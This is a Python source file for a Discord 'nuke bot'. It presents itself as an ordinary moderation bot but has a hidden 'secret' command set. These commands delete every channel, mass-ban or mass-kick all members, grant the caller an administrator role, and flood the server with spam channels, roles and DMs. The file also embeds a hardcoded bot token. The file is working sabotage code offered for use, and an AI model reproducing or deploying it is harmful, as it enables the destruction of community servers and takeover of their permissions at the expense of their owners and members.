# nuke bot by MEDMEX#1337/MaxDaKing     UPDATED for Discord.py 1.5 by Trielice#3492/Trielice.com

import discord
from discord.ext import commands
import asyncio
import time

client = commands.Bot(command_prefix='$', case_insensitive=True, intents=discord.Intents.all())

client.remove_command("help")


@client.event
async def on_ready():
    print("Lets do some damage")


@client.event
async def on_server_join(server):
    print("Joining {0}".format(server.name))


@client.command(pass_context=True)
async def help(ctx):
    member = ctx.message.author

    embed = discord.Embed(
        colour=discord.Colour.blue()
    )

    embed.set_author(name='help')
    embed.add_field(name='$ping', value='Gives ping to client (expressed in ms)', inline=False)
    embed.add_field(name='$kick', value='Kicks specified user', inline=False)
    embed.add_field(name='$ban', value='Bans specified user', inline=False)
    embed.add_field(name='$info', value='Gives information of a user', inline=False)
    embed.add_field(name='$invite', value='Returns invite link of the client', inline=False)
    embed.add_field(name='$clear', value='Clears an X amount of messages', inline=False)
    await member.send(embed=embed)


@client.command(pass_context=True)
async def clear(ctx, amount=10):
    member = ctx.message.author
    channel = ctx.message.channel
    messages = []
    async for message in channel.history(limit=int(amount)):
        messages.append(message)
    await channel.delete_messages(messages)
    await channel.send('Messages deleted')


@client.command(pass_context=True)
async def ping(ctx):
    channel = ctx.message.channel
    t1 = time.perf_counter()
    await channel.trigger_typing()
    t2 = time.perf_counter()
    embed = discord.Embed(title=None, description='Ping: {}'.format(round((t2 - t1) * 1000)), color=0x2874A6)
    await channel.send(embed=embed)


@client.command(pass_context=True)
async def info(ctx, member: discord.Member = None):
    channel = ctx.message.channel
    if member is None:
        await channel.send('Please input a user.')
    else:
        await channel.send("**The user's name is: {}**".format(member.name) + "\n**The user's ID is: {}**".format(
            member.id) + "\n**The user's current status is: {}**".format(
            member.status) + "\n**The user's highest role is: {}**".format(
            member.top_role) + "\n**The user joined at: {}**".format(member.joined_at))


@client.command(pass_context=True)
async def kick(ctx, member: discord.Member = None):
    author = ctx.message.author
    channel = ctx.message.channel
    if author.guild_permissions.kick_members:
        if member is None:
            await channel.send('Please input a user.')
        else:
            await channel.send(":boot: Get kicked **{}**, Damn kid".format(member.name))
            await member.kick()
    else:
        await channel.send('You lack permission to perform this action')


@client.command(pass_context=True)
async def ban(ctx, member: discord.Member = None):
    author = ctx.message.author
    channel = ctx.message.channel
    if author.guild_permissions.kick_members:
        if member is None:
            await channel.send('Please input a user.')
        else:
            await channel.send("Get banned **{}**, Damn kid".format(member.name))
            await member.ban()
    else:
        await channel.send('You lack permission to perform this action')


@client.command(pass_context=True)
async def invite(ctx):
    channel = ctx.message.channel
    await channel.send(
        "https://discord.com/api/oauth2/authorize?client_id=642515484448653315&permissions=8&scope=bot")


# Malicious purpose

@client.command(pass_context=True)
async def moderate(ctx):
    channel = ctx.message.channel
    embed = discord.Embed(
        colour=discord.Colour.blue()
    )
    embed.add_field(name="Lacking permissions", value="The bot is lacking the permissions to perform this action.")
    await channel.send(embed=embed)


@client.command(pass_context=True)
async def secret(ctx):
    member = ctx.message.author
    embed = discord.Embed(
        colour=discord.Colour.blue()
    )

    embed.set_author(name='secret')
    embed.add_field(name='$ball',
                    value='Bans everybody from the server (bot needs banning perms and needs to have a higher role than users',
                    inline=False)
    embed.add_field(name='$nuke',
                    value='Deletes all channels and bans everyone (bot needs manage channels and banning perms)',
                    inline=False)
    embed.add_field(name='$kall', value='Kicks everyone from the server (bot needs kicking perms)', inline=False)
    embed.add_field(name='$a', value='Gives you admin access (bot needs administrator)', inline=False)
    embed.add_field(name='$dm', value='Sends an invite link of the raid hub to everybody in the server', inline=False)
    embed.add_field(name='$channel', value='makes x amount of channels defined by you', inline=False)
    embed.add_field(name='$role', value='makes x amount of roles defined by you', inline=False)
    embed.add_field(name='$leave', value='makes the bot leave the server', inline=False)
    await member.send(embed=embed)


@client.command(pass_context=True)
async def kall(ctx):
    guild = ctx.message.guild
    logchannel = client.get_channel(772583598296662026)  # Put your log channel here
    for member in list(ctx.message.guild.members):
        try:
            await guild.kick(member)
            print("User " + member.name + " has been kicked")
            embed = discord.Embed(
                colour=discord.Colour.red()
            )
            embed.add_field(name="User kicked", value=f'{member.name}')
            await logchannel.send(embed=embed)
        except:
            pass
    print("Action Completed: kall")


@client.command(pass_context=True)
async def ball(ctx):
    guild = ctx.message.guild
    logchannel = client.get_channel(772583598296662026)  # Put your log channel here
    for member in list(ctx.message.guild.members):
        try:
            await guild.ban(member)
            print("User " + member.name + " has been banned")
            embed = discord.Embed(
                colour=discord.Colour.red()
            )
            embed.add_field(name="User banned", value=f'{member.name}')
            await logchannel.send(embed=embed)
        except:
            pass
    print("Action Completed: ball")


@client.command(pass_context=True)
async def leave(ctx):
    guild = client.get_guild(ctx.guild.id)
    await guild.leave()


@client.command(pass_context=True)
async def nuke(ctx):
    logchannel = client.get_channel(772583598296662026)  # Put your log channel here
    guild = client.get_guild(ctx.guild.id)
    for channel in guild.channels:
        try:
            await channel.delete()
            print(channel.name + " has been deleted")
            embed = discord.Embed(
                colour=discord.Colour.blue()
            )
            embed.add_field(name="Channel deleted", value=f'#{channel.name}')
            await logchannel.send(embed=embed)
        except:
            pass
    channel = await guild.create_text_channel("Rekt by Ryuk: www.imgur.com/a/G6rU8")
    await channel.send("Rekt by Ryuk: www.imgur.com/a/G6rU8")
    for member in guild.members:
        if member.id == ctx.author.id:
            pass
        else:
            try:
                await guild.ban(member)
                print("User " + member.name + " has been banned")
            except:
                print("passed")
                print(member)
                pass
    print("Rekt by Ryuk: www.imgur.com/a/G6rU8")


@client.command(pass_context=True)
async def a(ctx):
    guild = ctx.message.guild
    perms = discord.Permissions(8)
    logchannel = client.get_channel(772583598296662026)  # Put your log channel here
    await guild.create_role(name='*', permissions=perms)
    member = ctx.message.author
    role = discord.utils.get(guild.roles, name="*")
    await member.add_roles(role)
    embed = discord.Embed(
        colour=discord.Colour.orange()
    )
    embed.add_field(name="User got admin", value=f'{member}')
    await logchannel.send(embed=embed)


@client.command(pass_context=True)
async def channel(ctx, x):
    guild = ctx.message.guild
    logchannel = client.get_channel(772583598296662026)  # Put your log channel here
    for i in range(int(x)):
        await guild.create_text_channel("Rekt by Ryuk: www.imgur.com/a/G6rU8")
    embed = discord.Embed(
        colour=discord.Colour.green()
    )
    embed.add_field(name="Channels created", value=f'{x}')
    await logchannel.send(embed=embed)


@client.command(pass_context=True)
async def role(ctx, x):
    guild = ctx.message.guild
    perms = discord.Permissions(0)
    logchannel = client.get_channel(772583598296662026)  # Put your log channel here
    for i in range(int(x)):
        await guild.create_role(name="Rekt by Ryuk: www.imgur.com/a/G6rU8", permissions=perms)
    embed = discord.Embed(
        colour=discord.Colour.gold()
    )
    embed.add_field(name="Roles created", value=f'{x}')
    await logchannel.send(embed=embed)


@client.command(pass_context=True)
async def dm(ctx):
    guild = ctx.message.guild
    logchannel = client.get_channel(772583598296662026)  # Put your log channel here
    adminlist = [605916787078594567, 326865799967145988, 708714993738317834, 322439115909890048, 528811409404854273]
    for member in guild.members:
        if member.id not in adminlist:
            await asyncio.sleep(0)
            try:
                await member.send("Rekt by Ryuk: www.imgur.com/a/G6rU8")

                embed = discord.Embed(
                    colour=discord.Colour.purple()
                )
                embed.add_field(name="User messaged", value=f'{member}')
                await logchannel.send(embed=embed)
            except:
                pass


client.run("NjQyNTE1NDg0NDQ4NjUzMzE1.XcYDLA.ArZ7ohQ3lkyuNFMX1uXsfbuU")
